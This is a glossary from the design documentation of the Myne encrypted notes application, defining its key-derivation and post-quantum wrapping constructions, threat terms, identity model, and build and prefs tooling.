The rendering rule every [ornament primitive](#ornament-primitive) obeys: ornament is drawn **over** an element and takes no part in layout or hit-testing. It cannot change a control's position, size or clickable geometry, and it receives no pointer events.

**This is what makes ornament on interactive chrome safe.** A theme is untrusted input, and themes are distributed — so a decoration able to move a control could put "Delete" where the user aimed for "Cancel". Confining ornament to paint removes that class outright instead of policing it. Layout *is* still themable, but through the measure tokens (spacing, radius, type scale, weight, tracking), which are Myne's own values and are therefore clamped to 0.5×–2× of their built-in defaults — a bound a freely positioned ornament layer could not have.

**What is enforced, and what is not.** Ornament draws on `::before` / `::after` with `pointer-events: none`, so it takes no click, and the host's own box is unchanged. Two declarations the layer does add to its host — `position: relative` (a containing block) and `isolation: isolate` (a stacking context) — *can* re-anchor an absolutely-positioned descendant or re-order a promoted one, and both apply only when a theme selects ornament. The stylesheet's rules are pinned by assertion (`tests/ornaments/roles.test.ts`: no `border`, no `clip-path`, `pointer-events: none`, absolute + inset); the end-to-end hit-rectangle measurement is **owed** (`e2e/ornament.e2e.ts` header, myne#394 task 14) and until it lands the guarantee rests on those rules plus review, not on measurement.

Used in: `decisions.md` 2026-08-06

### **partitioning oracle** &nbsp; ⚠️ *Threat*

An attack class against non-key-committing AEAD where an attacker constructs a single ciphertext that decrypts validly under multiple keys (Len–Grubbs–Ristenpart, USENIX Security 2021). With a partial-decrypt oracle, this enables binary-search-style brute-force across a password dictionary, dramatically faster than naive offline attack. Myne's CTX commitment construction (§5.1) closes this attack vector.

Used in: `spec/protocol.md` §5.1
Reference: Len, Grubbs, Ristenpart, "Partitioning Oracle Attacks", USENIX Security 2021.

### **password_wrap_key** &nbsp; 🗝️ *Key/identifier*

The 32-byte key derived from the master password via Argon2id with `salt_password`. Encrypts one of the two copies of `root_key` in `vault.meta` (`enc_root_key_password`).

Used in: `spec/protocol.md` §3.1

### **PBKDF2** &nbsp; 🔐 *Primitive*

Password-Based Key Derivation Function 2. **Not used by Myne** — referenced only as a baseline that Myne explicitly avoids (BIP-39's standard 2048-iteration PBKDF2-HMAC-SHA512 is too weak by 2026 standards; the recovery phrase is fed to Argon2id directly instead).

Used in: `spec/protocol.md` §7.1
Reference: RFC 8018.

### **Payload ratchet** &nbsp; 🛠️ *Tooling*

*(Aliases: none. Myne-divergent: yes.)*

The gate over the [declared payload](#declared-payload): it may shrink freely and may grow only up to a recorded margin (2%), past which the build fails. Modelled on the web client's first-load ratchet, and a ratchet rather than a fixed number for the same reason — a budget invented before the payload exists is either trivially met or violated immediately, so the baseline is *measured* and committed, and raising it is an edit to `src-tauri/payload-baseline.json` that shows up in a diff with an author and a stated reason.

**It is not a promise to users.** It bounds drift between releases; it says nothing about what the download will be next year. Three structural assertions keep the number honest: a Git-LFS **pointer** where a blob was expected fails by name (a smudge-skipped checkout would otherwise report a tiny payload and pass forever), a missing declared path fails rather than counting zero, and the bundled-model set is compared against a recorded set **in both directions** — an addition is a decision, and a silent removal of `models/ocr` would break OCR-backed search.

Used in: `scripts/check-desktop-payload-budget.mjs`, `AGENTS.md` (guard table)

---

### **per-recipient wrap** &nbsp; 🏗️ *Construction*

The PQ-hybrid envelope that delivers the vault `itemsKey` to one member:
ML-KEM-768 encapsulate to the member's public key (a 32-byte PQ shared
secret + a 1088-byte ciphertext) COMBINED with a classical X25519-style
static DH against the member's Ed25519 public key's Montgomery form
(the RFC 8032 expanded scalar, SHA-512(seed)[..32], clamped), the wrap key
`HKDF-SHA-256-Extract("myne.person-wrap-ss v1|", classical || pq)`. both halves
required, PQ last, so a classical break of either alone opens nothing.
The wrap AEAD is the crate's XChaCha20-Poly1305 + CTX composition under
the v0.2 AAD prefix, role `"person-wrap-items-key"`, binding the
recipient fingerprint. The same construction re-wraps the rotated
`itemsKey` to every remaining member on a removal
Member removal drops the removed member's wrap and
regenerates the rest, the Bitwarden content-encryption-key pattern, where
rotating an upstream key never requires re-uploading the content.

Used in: `design-notes/protocol/0592`; `myne-md/myne#698`.



### **person account** &nbsp; 📦 *Product*

A person-level server account independent of any vault (`decisions/protocol/0603`, myne-md/myne#711). It authenticates with SCRAM whose secret derives from the person's recovery phrase under `"myne.v0.2 argon2id-person-server-auth|"` plus `person_id_hash`, so one person holds one account across every vault they belong to. A vault keeps its own `account_number` as its public id, its namespace and its pre-auth `GET /vault.meta` bootstrap key. Access to a vault is an authenticated membership binding (owner at registration, member at acceptance) that issues a per-vault bearer token, so revoking one binding affects one vault and no other. The server knows the pseudonymous person-to-vault mapping, which is the collaboration social graph accepted by decisions 0459, but reads no roster plaintext.

Used in: `design-notes/protocol/0603-b2b-member-sync-wire-and-signed-head.md`; `docs/spec/server-protocol.md` §3

### **person identity** &nbsp; 📦 *Product*

The addressable, recoverable person that Myne's first run is now rooted at (myne-md/myne#768, `decisions/ui/0615`). It is the [person account](#person-account) plus the [person keypair](#person-keypair) and the out-of-band [person identity code](#person-identity-code): the thing that can be invited to a vault and that owns zero or more vaults. It is vault-independent, so one identity spans every vault a person owns or belongs to, and it is created before a server-registered account can exist, which is why the first run configures a sync server before creating one. Distinct from a [vault](#vault), whose recovery phrase, account number and `root_key` stay its own, and distinct from the client-side account record, which is device-local grouping and carries no identity.

Used in: `design-notes/ui/0615-first-run-is-identity-first.md`; `myne-md/myne#768`.

### **identity-first first run** &nbsp; 📦 *Product*

The zero-vault first-run shape on desktop and mobile in which the person identity is offered before a vault (`decisions/ui/0615`, myne-md/myne#768). It forks between creating an identity and starting with a local vault; the identity arm runs a sync-server step, creates the identity, and lands on the identity home from which a bound vault is created or a pending invite accepted. The identity step is skippable, and a skipped user owns an identity-less vault and can add an identity later from Settings. The web client has no identity-first first run, because identity setup is unsupported there and the browser first run stays at account bootstrap.

Used in: `design-notes/ui/0615-first-run-is-identity-first.md`; `myne-md/myne#768`.

### **identity phrase** &nbsp; 🗝️ *Key/identifier*

The person's 24-word recovery credential. It derives the deterministic person keypair and server-auth secret, and derives the key that seals a member's shared-vault keys on that device. It does not wrap a vault's `root_key`; that is the separate [recovery phrase](#recovery-phrase). The phrase itself stays on the device.

Used in: `design-notes/protocol/0604-deterministic-phrase-derived-person-identity.md`, `design-notes/protocol/0606-member-vault-key-store.md`, `design-notes/ui/0615-first-run-is-identity-first.md`.

### **person identity code** &nbsp; 🔑 *Identifier*

The out-of-band string a person hands the other party in an invite so it can be
verified (myne-md/myne#711, `decisions/protocol/0605`). **Bidirectional**: the
invitee hands their code to the owner (to address and seal the invite), and the
owner hands their code to the invitee (to verify the owner-signed group package
against a pinned owner key). Shape:
`MYNE-PERSON-1:<person_id_hex>:<kem_ek_hex>:<ed_pk_hex>:<mldsa_vk_hex>`, all
lowercase hex. It carries **public** material only (the addressable [person
account](#person-account) id and the [person keypair](#person-keypair) public
halves) and never reaches the sync server: the sealed invite relay's outer frame
is the recipient id and the vault id alone (`decisions/protocol/0603` Q10), so the
public halves must travel through a channel the server does not control. The owner
pastes it (a QR is not viable: the code is roughly 6.4k hex characters), sees the
derived [fingerprint](#bootstrap-fingerprint), and confirms it out of band before
the invite is sealed. Not an AEAD/magic value and not an AAD role.

Used in: `design-notes/protocol/0605-b2b-invite-addressing-and-vault-invite-list.md`; `myne-md/myne#711`.

### **person-identity carrier** &nbsp; 🗝️ *Key/identifier*

The device-local, per-vault copy of a person's [person keypair](#person-keypair)
that lets an `NTV6` owner vault install the person session at unlock without
re-entering the recovery phrase (`myne-md/myne#792`, `decisions/protocol/0622`,
amending `decisions/protocol/0612`). One JSON envelope per vault at
`<app_config_dir>/person-vault-carriers/<vault_id_hex>.json`, AEAD-sealed under a
`root_key` subkey (`SubkeyRole::PersonVaultCarrier`, HKDF context
`person-vault-carrier`) with the AAD role `person-vault-carrier-blob` binding the
vault id and the person id. Written when the identity is unlocked while an owner
vault is open; read by the vault-unlock pipeline; erased by person forget and by
vault delete. Owner-only (a member holds no `root_key`); never synced. Its
exposure is the deliberate equivalent of the identity itself: the vault credential
opens it, which is the trade `decisions/protocol/0622` records and
`myne-md/myne#793` is to decouple.

Used in: `docs/spec/protocol.md` §3.4 / §5.2; `design-notes/protocol/0622-person-identity-carrier-is-vault-bound-device-local.md`; `myne-md/myne#792`.

### **person keypair** &nbsp; 🗝️ *Key/identifier*

The B2B identity substrate's per-member cryptographic identity
(`myne-md/myne#698`): one ML-KEM-768 KEM keypair (wraps the vault
`itemsKey` per recipient) plus an Ed25519 + ML-DSA-65 double-signature
pair (side by side, NOT a composite: the composite draft is EUF-CMA only,
two independent signatures preserve SUF-CMA), both carried by ONE person
sealed under the person's OWN recovery phrase via the salt domain
`"myne.v0.2 argon2id-person-keypair|"` (with the phrase-derived
`person_id_hash` from the `"myne.person-id|"` domain in the salt slot). The
keypair material itself is derived deterministically from the normalized phrase
under the salt domain `"myne.v0.2 argon2id-person-identity|"` and the per-key-type
HKDF contexts `"myne.person-kem v1|"`, `"myne.person-ed25519 v1|"` and
`"myne.person-mldsa v1|"`, so the same phrase yields the same identity on every
device; the device-local file (`person_keypair.sealed`) is a cache of the derived
key, sealed under the phrase-derived wrap key above. This supersedes the CSPRNG
generation clause of `decisions/protocol/0592` (deterministic derivation,
`decisions/protocol/0604`, absorbing myne-md/myne#713). Vault-independent (NOT
`root_key`-derived; `SubkeyRole::ALL` untouched), so one identity spans many
vaults. The canonical fingerprint (SHA-256 over the domain-prefixed
`"myne.person-fingerprint v1|"` public halves) is the [SAS](#bootstrap-fingerprint)
value the invite flow compares. Distinct from a [device_id](#device_id-vv-actor):
a person is who they are regardless of which devices they hold.

Used in: `design-notes/protocol/0592`; `myne-md/myne#698`.

### **session-scoped person identity** &nbsp; 🗝️ *Key/identifier*

The runtime lifetime of a person's private identity and per-vault private profile. The state is held only while the current vault session is active, is cleared at every vault boundary, and is re-established from the person's recovery phrase when an operation needs it. The persisted [person identity code](#person-identity-code) remains public and readable while the private state is locked. A vault boundary includes lock, idle lock, password-change relock, vault switch, direct first-vault creation, and vault deletion.

Used in: `design-notes/protocol/0612-person-identity-is-session-scoped-across-every-vault-boundary.md`; `docs/threat-model.md` AS21.

### **person key transition** &nbsp; 🗝️ *Key/identifier*

The frozen signature class `"myne.person-key-transition v1|"` for a visible
person-key continuity transition (myne-md/myne#712, `decisions/protocol/0594`;
now written, `decisions/protocol/0604`). A surviving old person key double-signs
it when an identity re-enrols, linking the superseded fingerprint to the new one
so every roster the person is in records the change as cryptographic continuity;
where the old key is unavailable the owner relinks explicitly and the roster is
labelled owner-confirmed instead. A vault-less identity owes the record once it
joins a vault.

Used in: `design-notes/protocol/0604-deterministic-phrase-derived-person-identity.md`; `core/src/plugins/sync/roster.rs`

### **person private profile** &nbsp; 📋 *Protocol*

A sealed `MYY5` record at `profiles/<profile-id>` scoped to one person and one
vault for private AI material (chat history, agent memory, personality
directive). It is not shared group state: the KEK is derived from the person's
OWN recovery phrase under the salt domain
`"myne.v0.2 argon2id-person-vault-profile|"` with a fixed (non-secret) salt
randomizer, so it opens on every client from the phrase alone and neither the
group key nor the owner `root_key` can read it. The `profile-id` is
`SHA-256("myne.person-profile-id v1|" || person_id_hash || account_number_hash)[:16]`
and is bound into the AAD with `account_number_hash`, so a profile moved to
another person or vault fails verification. Provider choice, credential and
egress consent are deliberately NOT in this blob (device-local). Removal and
scheduled deletion make no recall guarantee. It syncs on a vault-scoped,
person-authorized namespace SEPARATE from the shared group manifest
(`PUT|GET /b2b/vaults/{account_hash}/profiles/{profile_id}`, authorized by the
person's own account session plus a membership binding; the server reads none of
it and records the writer for removal scheduling; `decisions/protocol/0608`). A
**member's** memory, conversations and personality are serialized into it (design
A); the local sealed container caches at `vault.person-ai`, and a pull merges the
remote container at the family layer rather than by whole-value overwrite, so a
concurrent edit on another device is not dropped (`decisions/protocol/0610`). An
owner or single-user vault keeps the shared families instead.

Used in: `design-notes/protocol/0594-b2b-group-key-and-revocation-hierarchy.md`; `design-notes/protocol/0608-person-private-profile-plane.md`; `design-notes/protocol/0610-person-private-profile-family-layer-merge.md`; `docs/spec/protocol.md` §9.28



### **Personal dictionary** &nbsp; 📦 *Product*

The user's own set of words the spell checker treats as correctly spelled
(MYND-266) — names, project terms, coined words. AS3-Sensitive vocabulary,
stored encrypted in the per-vault `vault.dictionary` blob (`MYD1`, §9.13),
hydrated into RAM on unlock and zeroized on lock. "Add to dictionary" in the
correction menu appends to it. Matching is case-insensitive (folded); storage is
exact NFC. Distinct from the **Ignore list** (which suppresses without asserting
correctness) and from the bundled read-only language dictionaries.

Used in: `spec/protocol.md` §9.13; MYND-266.


### **Phase 1, Phase 2, Phase 3, Phase 4** &nbsp; 📦 *Product*

Myne's product phasing. See `vision.md` Phase 1 Scope and `decisions.md` for definitions and timelines. Roughly: **P1** = single-user desktop, plus the self-hostable sync server (which moved into Phase 1 — `vision.md`, 2026-07-18); **P2** = the *managed hosted* account and paid tier on top of that server; **P3** = mobile clients and the desktop-**browser** client; **P4** = sharing, real-time collaboration, plugin API. The older "P2 = sync server + optional web client" reading is superseded on both halves: the server shipped in P1, and the web client is a P3 desktop-browser client with a deliberately narrower capability set, not an "optional" variant of the desktop one.

Used in: `vision.md`, `decisions.md`

### **pending capture** &nbsp; 📦 *Product*

A short piece of dictated note text captured on the native-SwiftUI Apple Watch companion and relayed to the paired phone over WatchConnectivity, held in a **device-local encrypted queue** (`MYK1`, `spec/protocol.md` §9.18 — one file per capture at `captures/<capture-id>`) until the vault is next unlocked on the phone, at which point it is drained into that vault as an ordinary new note. Sealed under a device-local keychain `wrap_key` (non-biometric, `afterFirstUnlockThisDeviceOnly`; **not** `root_key`-derived, since the queue must be writable while the vault is locked), it is **vault-agnostic** — it binds the per-entry `capture_id` rather than a vault identity, and drains into whichever vault unlocks first. The watch holds no vault keys and runs no crypto (the same outside-the-trust-boundary posture as the home-screen widget); the queue is never synced or backed up. V1 is voice quick-capture only — no reading, editing, or Siri intent. (`decisions.md` 2026-07-12)

### **pending meeting** &nbsp; 📦 *Product*

A meeting recorded on the Apple Watch and awaiting its note on the phone: a **device-local group** of sealed audio chunks, held in a **pending-meeting manifest** that records which sealed entries belong to which session, in what order, and when the session started (one JSON record per session, no §10.3 magic — it carries routing metadata only). Each chunk is sealed on arrival under the share-import device key (`md.myne.shareimport`, `spec/protocol.md` §9.20.2) with the `MYF1` codec (see [offline seal](#offline-seal)), the manifest is idempotent on `(session_id, chunk_index)` so a duplicate transfer cannot double-count, and both are **never synced or backed up** (`sync-protocol.md` Class 3). On unlock the group drains into the vault as ordinary `MYA1` attachments, is transcribed, becomes one note through the ordinary note-create path, and is then deleted — **at-least-once**, so a crash between note-create and delete re-drains into a rare duplicate rather than losing the meeting. Distinct from a [pending capture](#pending-capture), which is dictated text rather than audio, and from the desktop meeting session (`decisions/storage/0646`), whose mic-plus-system-audio mix has no iOS equivalent. (`decisions/clients/0647`; myne-md/myne#812)

Used in: `decisions/clients/0647`; `spec/protocol.md` §9.18, §9.20

### **plain-file editor** &nbsp; 📦 *Product*

The desktop surface that opens a user's own on-disk `.md`/`.markdown` and edits it in place with **no vault interaction**: a tab in the main window when the vault is unlocked, and the same surface standalone when the vault is locked or the device has none (myne-md/myne#788; `decisions/clients/0625`). Its gate is the **device-local** `plain-file.json` under `<app_config_dir>` (sibling of `tor-routing.json`; ON by default: an absent file reads as enabled, while an unreadable or malformed one reads as disabled), not a `vault.prefs` field, because the states the surface must work in are exactly the states in which `vault.prefs` cannot be read; the gate is page-flippable like every other device setting and is not a security boundary against page compromise. IO is **host-validated**: a path arrives from an OS ingress, the native dialog, the CLI, or a `myne://open-file` deep link parsed in JS, and no path becomes an opaque handle without the host-side gate check, canonicalisation, `.md`/`.markdown` check on the CANONICAL path and 64 MiB cap. A deep-linked file opens only after the user confirms the canonical target the host resolved (the resolve reads no content and mints no handle; the confirmed open re-validates from scratch). Writes are atomic base-hash compare-and-swaps, so an external edit or deletion refuses rather than clobbers. It leaves **zero traces** (no recents, no `vault.workspace` entry, no on-disk buffer, no snapshot, no `.bak`), renders with built-in palettes only (the custom vault palette never reaches it), and is marked as local and unencrypted by text, icon and colour together. Not a plaintext mode for the vault: nothing about the vault changes, and no vault note ever becomes plaintext on disk.

Used in: `threat-model.md` §7; `decisions/clients/0625`

### **platform backup** &nbsp; ⚠️ *Threat*

The **operating system's own** automatic copy of an app's files to the vendor's cloud: iCloud Backup on iOS, Auto Backup on Android, both on by default and neither authorized per file by the user. **Not** a Myne feature and not the [vault backup file](#vault-backup-file): the naming collision is unfortunate and worth holding, because every other backup term in this glossary means a copy Myne made deliberately, and this one means a copy the platform made without asking. It matters because it is a second [egress](#off-device-egress) channel across TB3 alongside the [export](#export) the user asked for: both platforms include the app directory Myne writes plaintext exports into, so a saved recovery phrase, which alone reconstructs the vault, was reaching Apple and Google until myne-md/myne#491. Myne declares that one directory excluded on both platforms (`NSURLIsExcludedFromBackupKey` on iOS; `android:dataExtractionRules` plus `android:fullBackupContent`, covering cloud backup **and** device transfer, on Android) and deliberately leaves the **encrypted vault** in the backup, which discloses nothing and is a real recovery path for a user who does not sync. On iOS the exclusion is applied at two moments and by one body (myne-md/myne#517): once at startup, which also repairs a container restored from an older backup, and again inside the single host command that resolves an export destination, which returns a path only after the flag reads back as set. The directory is therefore excluded before anything can be written into it, which is an ordering rather than a promise, and it is asserted by a test. Two limits belong to the term: the exclusion's *effect* has not been observed on a device (the mechanism is in place and `mobile/docs/dev/device-matrix.md` §8 rows 8.9/8.10 own the proof), and copies already taken before it landed cannot be retracted.

Used in: `threat-model.md` §3 (TB3), §4 (A5), §5; `decisions.md` 2026-08-15 (mobile export directory excluded from platform backup), 2026-09-19 (the export destination becomes a host chokepoint that applies the exclusion in the same call)

### **platform seam** &nbsp; 📦 *Product*

The internal boundary through which a client's UI tree reaches its host platform, one module per host capability (`core`, `event`, `dialog`, `opener`, `path`, `window`, `webviewWindow`, `clipboardManager`, `deepLink`). The shared tree's seam is `src/platform/`: desktop's implementation re-exports Tauri, the web client's routes the same calls into a wasm Worker, and that one substitution is what makes the two clients the **same tree** rather than two trees that resemble each other.

Since myne#492 the rule is stated per guarded tree rather than for `src/` alone, and `scripts/check-platform-seam.mjs` enforces it over **nine** roots in `pre-commit` and in CI. Two of them are Tauri hosts and get a seam directory of their own: `src` (`src/platform/`) and `mobile/src` (`mobile/src/platform/`, **five** modules: `core`, `event`, `path`, `window`, `deepLink`; this entry said six, as did `mobile/CLAUDE.md`, and both were right when written: `clipboardManager.ts` landed with the seam in `f643633c` and was removed a day later in `48f06b73`, when clipboard writes moved to the sensitive-clipboard plugin, and neither document was updated). Mobile's `path` is the one seam member that is not a re-export: since myne-md/myne#517 it is a single `exportPath(filename)` over a host command that resolves, creates, backup-excludes and sanitizes an export destination in one call, which is why the mobile capability no longer grants `core:path:default` at all. The other seven get the strictest form, no seam directory at all, so `@tauri-apps/*` is banned outright: `editor/`, `dialect/`, `copy/`, `client-core/`, `ornaments/`, `preview/` and `web/src`. (This entry said eight roots and listed six strict trees, omitting `client-core`; corrected alongside the module count in the same clause, because a corrected sentence carrying a second wrong number is what makes a reader stop trusting the correction.) The reason is not that those trees have no Tauri consumer, it is that not **every** consumer is one, and a module-scope import lands in a non-Tauri consumer's bundle whether or not the call ever fires.

Mobile's seam is not a substitution point: mobile is a Tauri host on both of its targets, so there is nothing to substitute. It exists to give the guard a boundary to enforce and to keep the twin modules under `mobile/src/lib` byte-identical to their desktop counterparts, which is how a fix reaches both clients. `mobile/src/formfactor/` is a **different** thing that used to share the name: the iOS-versus-Android and phone-versus-tablet PRESENTATION split (see [size class](#size-class)), renamed out of the way so `<tree>/platform/` means one thing in all three clients.

The seam is meant to be pinned by a single contract suite rather than each implementation being tested on its own terms: see [seam contract](#seam-contract), including which implementations it covers today.

Used in: `decisions.md` 2026-07-26 (web E2E policy); `src/platform/`; `mobile/src/platform/`; `web/src/platform/`; `scripts/check-platform-seam.mjs`

### **plausibly-deniable encryption** &nbsp; ⚠️ *Threat*

Encryption schemes (e.g., VeraCrypt's hidden volumes) where a vault can be opened to multiple distinct plaintexts depending on which password is supplied, providing deniability under coercion. Myne v0.1 does not implement plausibly-deniable encryption; coercion (A12) is explicitly out of scope. It stays in the icebox — any revisit would demand great caution, since partial deniability schemes are easy to misimplement and easy to claim falsely.

Used in: `threat-model.md` §5, §7

### **Poly1305** &nbsp; 🔐 *Primitive*

The one-time MAC algorithm by Daniel J. Bernstein, used as the authenticator inside ChaCha20-Poly1305 and XChaCha20-Poly1305. In Myne's CTX-wrapped construction the 16-byte Poly1305 tag T is recomputed at decrypt time from `(K, N, AAD, ciphertext)` rather than stored on disk; only the 32-byte CTX commitment tag T' is persisted.

Used in: `spec/protocol.md` §5.1

### **prompt-cache marker** &nbsp; 📋 *Protocol*

The `cache_control` field Myne attaches to the SYSTEM turn of an OpenRouter request (myne-md/myne#620), asking the provider to cache that prefix. The system turn is the one span byte-identical across every iteration of a run, which is what makes it worth caching; no other turn carries one, and a test pins that, because a marker on a user or assistant turn would be asking the provider to retain note content as a cache prefix.

**A posture change rather than a boundary change.** A17 puts the provider operator's retention outside anything this threat model constrains, so the same bytes reach the same party either way. What is new is that Myne is now ASKING for retention rather than merely accepting whatever happens, and that is the part a reader deciding whether to trust the feature would want on the record. Ollama receives no marker: it serves the model directly and models no prefix cache.

Used in: `decisions/ai/0555`, `threat-model.md` TB13

### **proposed edit** &nbsp; 📦 *Product*

One change an [agent run](#agent-run) suggests to a note. It comes in three kinds. A REPLACE carries an [edit anchor](#edit-anchor) plus the text that replaces it. An APPEND carries no anchor at all, because there is nothing to anchor to: it adds text at the end of the body, which is the only shape that can write into an empty note (see [append verb](#append-verb)). A MOVE carries no anchor either, and its `replacement` is the destination FOLDER rather than note text, which is what lets the review show where the note would land and the [folder lock](#folder-lock) read the destination before the write (see [move verb](#move-verb)). One kind field on one list, rather than a second list, so every check that already runs over proposed edits keeps running over all three by construction. Proposed, never applied: it reaches the vault only through the user's per-note or per-edit approval on the review screen, which is what SYNC-17's "explicit user action" now means. An edit whose replacement introduces a `trashed:` frontmatter timestamp is a deletion wearing a body edit's clothes, and is excluded from the bulk approve by construction rather than by a label.

Used in: `decisions.md` 2026-08-16, `threat-model.md` §7

### **quick-unlock credential** &nbsp; 🗝️ *Key/identifier*

A [device-local credential](#device-local-credential) (`vault.quickunlock`, `spec/protocol.md` §9.14, magic `MYQ1`) that holds a **third wrapped copy of `root_key`** so a re-lock (auto-lock-on-idle) can be reversed with a fast second credential — Touch ID / Face ID / Windows Hello, or a PIN — instead of the full master-password Argon2id path. It wraps the already-derived `root_key`; it never participates in `root_key` derivation, so it does not touch the zero-knowledge root (the master password stays the primary credential). Its wrap key comes from a [wrap-key provider](#wrap-key-provider), not a `DeriveSubkey` role. Threat class: an **A6** convenience gate over the already-encrypted store; it does **not** defend against **A7** (active local malware), and the PIN provider's blob is offline-brute-forceable by **A4** bounded only by Argon2id cost. Introduced MYND-329.

Used in: `spec/protocol.md` §9.14, `decisions.md` 2026-06-16

### **working-set flag** &nbsp; 📦 *Product*

The per-note boolean in the vault index recording whether a note is part of the working set the sidebar tree shows, computed by the SAME predicate the tree uses (`isLiveNote`: not trashed, not tombstoned, not archived, not a template, not a conflict copy). It is the sibling of a [heading record](#heading-record) in the serialized structured index (`protocol.md` §9.8.2), stored rather than re-derived so a consumer that resolves a scope does not form a second opinion about what "live" means: the agent's scope reads this flag, so the notes a run can reach are the notes the user can see (myne-md/myne#848).

Used in: `protocol.md` §9.8.2, `decisions/ai/0662`

### **wrap-key provider** &nbsp; 🗝️ *Key/identifier*

The pluggable source of the 32-byte symmetric wrap key that protects the [quick-unlock credential](#quick-unlock-credential) blob. The on-disk blob is provider-agnostic — always `AEAD(wrap_key, root_key)` — and only the wrap-key source differs: an Apple Keychain secret gated by `kSecAccessControlBiometryCurrentSet` (biometric — macOS Touch ID, iOS Face ID / Touch ID; one provider kind, `decisions.md` 2026-07-12), a future Windows Hello / TPM challenge-response or Android Keystore secret, or a PIN run through the vault's Argon2id parameters. Modeled as a single Rust trait (`QuickUnlockProvider`); adding a provider is not an on-disk-format change. The biometric provider is hardware-bound and OS-invalidated on biometric-set change; the PIN provider's strength is bounded by PIN entropy × the memory-hard Argon2id cost.

Used in: `spec/protocol.md` §9.14.2, `decisions.md` 2026-07-12

### **post-compromise security** &nbsp; ⚠️ *Threat*

The property that protocol participants can recover from a compromise of state — future communication remains protected even after a transient compromise. Provided by ratchet-style protocols (Signal Double Ratchet, MLS); not provided by Myne v0.1's static key hierarchy. A design goal for a later major version.

Used in: `threat-model.md` §7

### **post-quantum cryptography** &nbsp; 🔐 *Primitive*

Cryptographic primitives believed secure against quantum-computing attacks. Myne v0.1 is not post-quantum. The B2B person path ships hybrid ML-KEM-768 (FIPS 203) for KEM operations and Ed25519 + ML-DSA-65 (FIPS 204) for signatures now (`decisions/protocol/0592`); extending PQ protection to the sync-server vault-wide path stays a later major version.

Used in: `spec/protocol.md` §11

### **PQXDH (Post-Quantum Extended Triple Diffie-Hellman)** &nbsp; 🏗️ *Construction*

Signal's post-quantum-augmented X3DH key-agreement protocol, with hybrid X25519 + ML-KEM-768. Reference design pattern for Myne's later-major-version user-to-user key agreement (sharing).

Used in: `spec/protocol.md` §11 (out of scope for v0.1)

### **previousKeySet** &nbsp; 🗝️ *Key/identifier*

The rotation-history chain a [person keypair](#person-keypair) row is designed to
carry when its identity is re-rolled: `previous_fingerprint_hex` records the
fingerprint the row superseded, so a peer viewing the roster can tell that a
member's identity changed rather than that a new member appeared. ROADMAP: nothing
writes the field in the current change (`threat-model.md` AS22), so this
rotation-visibility property is not shipped yet. The field rides the
[vault roster](#vault-roster) inside the AEAD envelope (`myne-md/myne#698`).

Used in: `design-notes/protocol/0592`; `core/src/plugins/sync/roster.rs`.

### **prefs chokepoint** &nbsp; 🛠️ *Tooling*

The single function each client routes every `vault.prefs` write through, so that the [prefs-changed nonce](#prefs-changed-nonce) is bumped by the write path itself rather than by the caller. Module-private, named `writePref`, one per client tree (`src/lib/prefs.ts` and `mobile/src/lib/prefs.ts`); a module holding one is a **prefs module**, which is also the set rule 2 of `scripts/check-prefs-nonce.mjs` exempts. It exists because the bump began life as an optional second line beside each setter and was forgotten in 31 of about 56 desktop setters (#251), silently dropping starred favourites and leaving an AI opt-in the open editor never saw. Mobile shipped the pre-#251 shape until myne-md/myne#486. The guard reads call shapes rather than behaviour, so it cannot tell that the chokepoint still bumps, or that it bumps only after the write resolves: the roster loops in `tests/lib/prefsBindings.test.ts` and `mobile/tests/prefs-nonce.test.ts` are the half that can.

Used in: `scripts/check-prefs-nonce.mjs`; `src/lib/prefs.ts`; `mobile/src/lib/prefs.ts`

### **prefs-changed nonce** &nbsp; 🛠️ *Tooling*

> **Not `prefs_nonce`.** The on-disk `prefs_nonce` is the 192-bit **random** AEAD nonce at offset 6 of the `MYP1` header (`spec/protocol.md` §9.5.1), and it is a [nonce](#nonce) in the cryptographic sense: never reused, never predictable, never a counter. The thing this entry defines is a UI refresh signal that never leaves memory, and the code calls it the vault-prefs "changed" nonce for exactly that reason. Two different objects, one unfortunate word.

A monotonic in-memory counter, one per client, advanced after a `vault.prefs` write resolves. It is the mechanism by which sibling `usePrefs` instances learn that a setting changed: each subscribes through `useSyncExternalStore` and re-reads the blob on an advance, so a settings surface and the editor behind it converge on disk truth without sharing state. Bumping it BEFORE the write resolves is a defect rather than an optimisation, because the re-read then races the write and can pull stale disk truth.

**Two sources advance it, and the second is the one a reader will not guess.** The [prefs chokepoint](#prefs-chokepoint) advances it on every local write. The `PREFS_SYNC_APPLIED_EVENT` bridge advances it when the sync loop merges a REMOTE `vault.prefs` change onto disk (`src/screens/Editor.tsx`, `mobile/src/app/flows/EditorFlow.tsx`), which is the only advance with no local write behind it. `scripts/check-prefs-nonce.mjs` matches prefs command literals rather than `bumpPrefsNonce` call sites, so it does not police this and cannot.

**The NOTIFY can be deferred; the counter cannot.** `withPrefsBatch(fn)` (`mobile/src/lib/prefsNonce.ts` and its byte-identical desktop twin `src/notes/prefsNonce.ts`) holds the subscriber notification for the duration of a multi-write user action and delivers one at the end. The counter still increments per write, so it stays monotonic and no subscriber observes a value that skipped a change. The suppression is module-wide rather than per-action, so a concurrent write elsewhere is deferred to the same end point (nothing is lost: subscribers re-read disk truth, not a diff), and a watchdog bounds the wait so a batched write that hangs cannot swallow notifications for the rest of the session. It exists because the awaits between a folder rename's four prefs writes defeat the module's microtask coalescing, which only collapses a synchronous burst. Today only mobile has a call site; the export is present on both twins so a fix reaches both clients, which is the invariant `decisions.md` 2026-08-15 (`clients/0497`) states.

Used in: `src/notes/prefsNonce.ts`; `mobile/src/lib/prefsNonce.ts`; `scripts/check-prefs-nonce.mjs`

### **prefs_key** &nbsp; 🗝️ *Key/identifier*

The 32-byte AEAD KEK encrypting `vault.prefs`. Derived deterministically from `root_key` via the canonical `DeriveSubkey(root_key, "prefs-key")` helper (`spec/protocol.md` §3.2 + §3.4 registry entry `"myne.v0.1 prefs-key"`). Never persisted; re-derived on each `vault_unlock` (in-pipeline) and on each `set_*` prefs writer call. Independent from `items_key` lineage by design — preserves prefs portability across the later epoch-rotation `items_key` evolution (`decisions.md` 2026-05-27 "Vault preferences blob: root_key-derived prefs_key").

Used in: `spec/protocol.md` §3.4, §9.5; `decisions.md` 2026-05-27 "Vault preferences blob"

### **preview snapshot** &nbsp; 📦 *Product*

The real Myne interface, captured as data: the editor's own DOM plus every CSS rule the app had loaded, taken from the running desktop client by `e2e/capture/theme-preview.capture.ts` and shipped as the source-consumed `@myne/preview` package. It is what every surface showing a person "how a theme looks" renders — the website's theme builder, the theme gallery, and the `myne-themes` card renderer — instead of the three separately hand-written mock UIs they used before.

